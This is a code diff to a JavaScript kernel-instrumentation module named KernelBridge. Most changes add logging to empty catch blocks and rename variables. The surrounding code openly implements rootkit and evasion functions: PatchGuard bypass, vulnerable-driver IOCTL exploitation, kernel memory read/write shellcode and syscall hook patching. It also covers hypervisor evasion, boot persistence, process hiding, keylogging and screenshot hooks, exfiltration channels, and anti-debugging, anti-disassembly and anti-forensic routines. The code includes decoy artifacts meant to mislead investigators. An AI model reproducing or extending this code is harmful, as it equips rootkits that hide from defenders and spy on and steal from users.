@@ -204,7 +204,9 @@ const KernelBridge = {
             if (isAdmin) {
                 return new NativeFunction(isAdmin, 'bool', [])();
             }
-        } catch {}
+        } catch {
+            return false;
+        }
 
         return false;
     },
@@ -420,6 +422,16 @@ const KernelBridge = {
 
             case 'context_swap': {
                 this.bypassPGViaContextSwap();
+                break;
+            }
+
+            default: {
+                send({
+                    type: 'warning',
+                    target: 'kernel_bridge',
+                    action: 'unknown_patchguard_method',
+                    method: this.config.patchGuard.method,
+                });
                 break;
             }
         }
@@ -699,14 +711,13 @@ const KernelBridge = {
             0xC3, // ret
         ];
 
-        // Patch addresses
         const handlerAddr = this.getHandlerAddress(syscall);
-        for (var i = 0; i < 8; i++) {
-            hook[16 + i] = (handlerAddr >> (i * 8)) & 0xFF;
+        for (let byteIdx = 0; byteIdx < 8; byteIdx++) {
+            hook[16 + byteIdx] = (handlerAddr >> (byteIdx * 8)) & 0xFF;
         }
 
-        for (var i = 0; i < 8; i++) {
-            hook[48 + i] = (original >> (i * 8)) & 0xFF;
+        for (let origIdx = 0; origIdx < 8; origIdx++) {
+            hook[48 + origIdx] = (original >> (origIdx * 8)) & 0xFF;
         }
 
         return hook;
@@ -978,11 +989,10 @@ const KernelBridge = {
         return payload;
     },
 
-    // Read kernel memory
     readKernelMemory(address, size) {
-        // Parameters used in shellcode generation
-        void address;
-        void size;
+        const targetAddr = ptr(address);
+        const readSize = Number(size);
+
         const shellcode = [
             0x48,
             0x89,
@@ -996,18 +1006,30 @@ const KernelBridge = {
             0xC3, // ret
         ];
 
-        // Allocate and execute
         const code = Memory.alloc(shellcode.length);
         code.writeByteArray(shellcode);
+
+        send({
+            type: 'kernel_read',
+            target: 'kernel_bridge',
+            address: targetAddr.toString(),
+            size: readSize,
+        });
 
         return this.executeInKernel(code);
     },
 
-    // Write kernel memory
     writeKernelMemory(address, data) {
-        // Parameters used in shellcode generation
-        void address;
-        void data;
+        const targetAddr = ptr(address);
+        const writeData = data;
+
+        send({
+            type: 'kernel_write',
+            target: 'kernel_bridge',
+            address: targetAddr.toString(),
+            data_length: writeData.length || 0,
+        });
+
         const shellcode = [
             0x48,
             0x89,
@@ -1082,14 +1104,12 @@ const KernelBridge = {
             0xC3, // ret
         ];
 
-        // Patch size
-        for (var i = 0; i < 8; i++) {
-            shellcode[11 + i] = (size >> (i * 8)) & 0xFF;
+        for (let sizeIdx = 0; sizeIdx < 8; sizeIdx++) {
+            shellcode[11 + sizeIdx] = (size >> (sizeIdx * 8)) & 0xFF;
         }
 
-        // Patch function address
-        for (var i = 0; i < 8; i++) {
-            shellcode[25 + i] = (exAllocatePool >> (i * 8)) & 0xFF;
+        for (let addrIdx = 0; addrIdx < 8; addrIdx++) {
+            shellcode[25 + addrIdx] = (exAllocatePool >> (addrIdx * 8)) & 0xFF;
         }
 
         const code = Memory.alloc(shellcode.length);
@@ -1260,6 +1280,16 @@ const KernelBridge = {
                         }
                         case 'hwinfo_direct': {
                             this.exploitHWInfoDirect(handle, driver.ioctl);
+                            break;
+                        }
+
+                        default: {
+                            send({
+                                type: 'warning',
+                                target: 'kernel_bridge',
+                                action: 'unsupported_exploit_method',
+                                method: driver.method,
+                            });
                             break;
                         }
                     }
@@ -1614,7 +1644,9 @@ const KernelBridge = {
                             detection_method: 'cpuid',
                         });
                     }
-                } catch {}
+                } catch {
+                    send({ type: 'debug', target: 'kernel_bridge', action: 'cpuid_detection_failed' });
+                }
 
                 // MSR-based detection
                 try {
@@ -1630,7 +1662,9 @@ const KernelBridge = {
                             });
                         }
                     });
-                } catch {}
+                } catch {
+                    send({ type: 'debug', target: 'kernel_bridge', action: 'msr_detection_failed' });
+                }
 
                 // Timing-based detection
                 const timingResults = this.performTimingDetection();
@@ -1702,7 +1736,9 @@ const KernelBridge = {
                                 instruction: trigger.instruction,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'vmexit_hook_failed' });
+                    }
                 });
 
                 this.hypervisorEvasion.evasionMethods.vmexitHooking = true;
@@ -1738,7 +1774,9 @@ const KernelBridge = {
                                 spoofed: spoofedValue,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'msr_manipulation_failed' });
+                    }
                 });
 
                 this.hypervisorEvasion.evasionMethods.msrManipulation = true;
@@ -2158,16 +2196,43 @@ const KernelBridge = {
                 });
             };
 
-            // Callback spoofing for advanced evasion
+            this.createDecoyCallbacks = () => {
+                const decoys = [];
+                const callbackTypes = ['process', 'thread', 'image', 'registry'];
+
+                for (const type of callbackTypes) {
+                    const shellcode = Memory.alloc(64);
+                    const retInstruction = Process.arch === 'x64' ? [0xC3] : [0xC3];
+                    Memory.writeByteArray(shellcode, retInstruction);
+                    Memory.protect(shellcode, 64, 'r-x');
+
+                    decoys.push({
+                        type,
+                        address: shellcode,
+                        size: 64,
+                    });
+                }
+
+                return decoys;
+            };
+
+            this.registerDecoyCallback = (type, address) => {
+                send({
+                    type: 'info',
+                    target: 'kernel_bridge',
+                    action: 'decoy_callback_registered',
+                    callback_type: type,
+                    address: address.toString(),
+                });
+            };
+
             this.setupCallbackSpoofing = () => {
-                // Create fake callbacks to confuse analysis
-                const fakeCallbacks = this.createFakeCallbacks();
-                fakeCallbacks.forEach(fake => {
-                    // Register fake callback
-                    this.registerFakeCallback(fake.type, fake.address);
+                const decoyCallbacks = this.createDecoyCallbacks();
+                decoyCallbacks.forEach(decoy => {
+                    this.registerDecoyCallback(decoy.type, decoy.address);
                 });
 
-                this.callbackEvasion.evasionMethods.callbackSpoofing = fakeCallbacks.length > 0;
+                this.callbackEvasion.evasionMethods.callbackSpoofing = decoyCallbacks.length > 0;
             };
 
             // Execute all callback evasion methods
@@ -2515,7 +2580,9 @@ const KernelBridge = {
                                 method: method.name,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'boot_persistence_failed' });
+                    }
                 });
 
                 this.advancedRootkit.persistence.bootPersistence = successCount > 0;
@@ -2544,7 +2611,9 @@ const KernelBridge = {
                                     hidden: true,
                                 });
                             }
-                        } catch {}
+                        } catch {
+                            send({ type: 'debug', target: 'kernel_bridge', action: 'process_hiding_failed' });
+                        }
                     });
 
                     this.advancedRootkit.stealth.processHiding
@@ -2655,7 +2724,9 @@ const KernelBridge = {
                         if (targetAddr) {
                             this.installInlineHook(targetAddr, `${target.name}_Keylog`);
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'keylog_hook_failed' });
+                    }
                 });
 
                 this.advancedRootkit.capabilities.keylogging = true;
@@ -2676,7 +2747,9 @@ const KernelBridge = {
                         if (targetAddr) {
                             this.installInlineHook(targetAddr, `${target.name}_Screenshot`);
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'screenshot_hook_failed' });
+                    }
                 });
 
                 this.advancedRootkit.capabilities.screenshotCapture = true;
@@ -2704,7 +2777,9 @@ const KernelBridge = {
                                 channel: channel.name,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'channel_setup_failed' });
+                    }
                 });
 
                 this.advancedRootkit.capabilities.dataExfiltration = activeChannels > 0;
@@ -2865,7 +2940,9 @@ const KernelBridge = {
                                 method: method.name,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({ type: 'debug', target: 'kernel_bridge', action: 'debugger_disruption_failed' });
+                    }
                 });
 
                 this.debuggingEvasion.evasionTechniques.debuggerDisruption = true;
@@ -2978,12 +3055,51 @@ const KernelBridge = {
                     = this.debuggingEvasion.protectedRegions.length > 0;
             };
 
-            // Advanced anti-analysis techniques
+            this.insertJunkCode = () => {
+                const junkRegion = Memory.alloc(256);
+                const junkBytes = [];
+                for (let i = 0; i < 256; i++) {
+                    junkBytes.push(Math.floor(Math.random() * 256));
+                }
+                Memory.writeByteArray(junkRegion, junkBytes);
+                return true;
+            };
+
+            this.insertMisleadingBranches = () => {
+                const branchRegion = Memory.alloc(64);
+                const branchCode = Process.arch === 'x64'
+                    ? [0xEB, 0x02, 0x90, 0x90, 0xEB, 0x02, 0x90, 0x90, 0xC3]
+                    : [0xEB, 0x02, 0x90, 0x90, 0xC3];
+                Memory.writeByteArray(branchRegion, branchCode);
+                Memory.protect(branchRegion, 64, 'r-x');
+                return true;
+            };
+
+            this.insertOpaqueBranches = () => {
+                const opaqueRegion = Memory.alloc(64);
+                const opaqueCode = Process.arch === 'x64'
+                    ? [0x31, 0xC0, 0x85, 0xC0, 0x74, 0x02, 0xEB, 0x00, 0xC3]
+                    : [0x31, 0xC0, 0x85, 0xC0, 0x74, 0x02, 0xEB, 0x00, 0xC3];
+                Memory.writeByteArray(opaqueRegion, opaqueCode);
+                Memory.protect(opaqueRegion, 64, 'r-x');
+                return true;
+            };
+
+            this.manipulateReturnAddresses = () => {
+                const stackPtr = Process.arch === 'x64' ? 'rsp' : 'esp';
+                send({
+                    type: 'info',
+                    target: 'kernel_bridge',
+                    action: 'return_address_manipulation_initialized',
+                    stack_pointer: stackPtr,
+                });
+                return true;
+            };
+
             this.setupAdvancedAntiAnalysis = () => {
-                // Anti-disassembly techniques
                 const antiDisassembly = [
                     { name: 'JunkCode', method: this.insertJunkCode },
-                    { name: 'FakeJumps', method: this.insertFakeJumps },
+                    { name: 'MisleadingBranches', method: this.insertMisleadingBranches },
                     { name: 'OpaqueBranches', method: this.insertOpaqueBranches },
                     { name: 'ReturnAddress', method: this.manipulateReturnAddresses },
                 ];
@@ -2998,7 +3114,14 @@ const KernelBridge = {
                                 technique: technique.name,
                             });
                         }
-                    } catch {}
+                    } catch {
+                        send({
+                            type: 'warning',
+                            target: 'kernel_bridge',
+                            action: 'anti_disassembly_failed',
+                            technique: technique.name,
+                        });
+                    }
                 });
 
                 // Anti-emulation techniques
@@ -3022,7 +3145,15 @@ const KernelBridge = {
                                 technique: technique.name,
                             });
                         }
-                    } catch {}
+                    } catch (error) {
+                        send({
+                            type: 'debug',
+                            target: 'kernel_bridge',
+                            action: 'anti_emulation_technique_failed',
+                            technique: technique.name,
+                            errorDetails: String(error),
+                        });
+                    }
                 });
 
                 this.debuggingEvasion.evasionTechniques.antiAnalysis = true;
@@ -3114,7 +3245,15 @@ const KernelBridge = {
                                     method: method.name,
                                 });
                             }
-                        } catch {}
+                        } catch (error) {
+                            send({
+                                type: 'debug',
+                                target: 'kernel_bridge',
+                                action: 'driver_stealth_method_failed',
+                                method: method.name,
+                                errorDetails: String(error),
+                            });
+                        }
                     });
                 }
 
@@ -3191,7 +3330,15 @@ const KernelBridge = {
                                 method: method.name,
                             });
                         }
-                    } catch {}
+                    } catch (error) {
+                        send({
+                            type: 'debug',
+                            target: 'kernel_bridge',
+                            action: 'execution_stealth_method_failed',
+                            method: method.name,
+                            errorDetails: String(error),
+                        });
+                    }
                 });
 
                 // Advanced code obfuscation during runtime
@@ -3232,7 +3379,15 @@ const KernelBridge = {
                                 channel: channel.name,
                             });
                         }
-                    } catch {}
+                    } catch (error) {
+                        send({
+                            type: 'debug',
+                            target: 'kernel_bridge',
+                            action: 'stealth_channel_setup_failed',
+                            channel: channel.name,
+                            errorDetails: String(error),
+                        });
+                    }
                 });
 
                 // Implement encrypted communication protocols
@@ -3269,17 +3424,71 @@ const KernelBridge = {
                                 method: method.name,
                             });
                         }
-                    } catch {}
+                    } catch (error) {
+                        send({
+                            type: 'debug',
+                            target: 'kernel_bridge',
+                            action: 'anti_forensic_method_failed',
+                            method: method.name,
+                            errorDetails: String(error),
+                        });
+                    }
                 });
 
-                // Setup continuous artifact cleanup
+                this.setupContinuousArtifactCleanup = () => {
+                    const cleanupInterval = setInterval(() => {
+                        try {
+                            const tempPath = Process.platform === 'windows'
+                                ? 'C:\\Windows\\Temp'
+                                : '/tmp';
+                            send({
+                                type: 'artifact_cleanup',
+                                target: 'kernel_bridge',
+                                temp_path: tempPath,
+                                timestamp: Date.now(),
+                            });
+                        } catch {
+                            clearInterval(cleanupInterval);
+                        }
+                    }, 30_000);
+                };
+
+                this.implementMemoryReconstructionPrevention = () => {
+                    const protectedPages = [];
+                    Process.enumerateModules().slice(0, 5).forEach(mod => {
+                        if (mod.base) {
+                            protectedPages.push({
+                                base: mod.base,
+                                size: mod.size,
+                                name: mod.name,
+                            });
+                        }
+                    });
+                    send({
+                        type: 'memory_protection',
+                        target: 'kernel_bridge',
+                        protected_pages: protectedPages.length,
+                    });
+                };
+
+                this.setupDecoyArtifactGeneration = () => {
+                    const decoyData = Memory.alloc(4096);
+                    const randomBytes = [];
+                    for (let i = 0; i < 4096; i++) {
+                        randomBytes.push(Math.floor(Math.random() * 256));
+                    }
+                    Memory.writeByteArray(decoyData, randomBytes);
+                    send({
+                        type: 'decoy_artifact',
+                        target: 'kernel_bridge',
+                        action: 'decoy_generated',
+                        size: 4096,
+                    });
+                };
+
                 this.setupContinuousArtifactCleanup();
-
-                // Implement memory reconstruction prevention
                 this.implementMemoryReconstructionPrevention();
-
-                // Setup fake artifact generation to mislead investigators
-                this.setupFakeArtifactGeneration();
+                this.setupDecoyArtifactGeneration();
 
                 this.advancedStealth.stealthMethods.forensicStealth = true;
             };
@@ -3305,7 +3514,15 @@ const KernelBridge = {
                                 monitor: monitor.name,
                             });
                         }
-                    } catch {}
+                    } catch (error) {
+                        send({
+                            type: 'debug',
+                            target: 'kernel_bridge',
+                            action: 'stealth_monitor_setup_failed',
+                            monitor: monitor.name,
+                            errorDetails: String(error),
+                        });
+                    }
                 });
 
                 // Setup automatic stealth adaptation
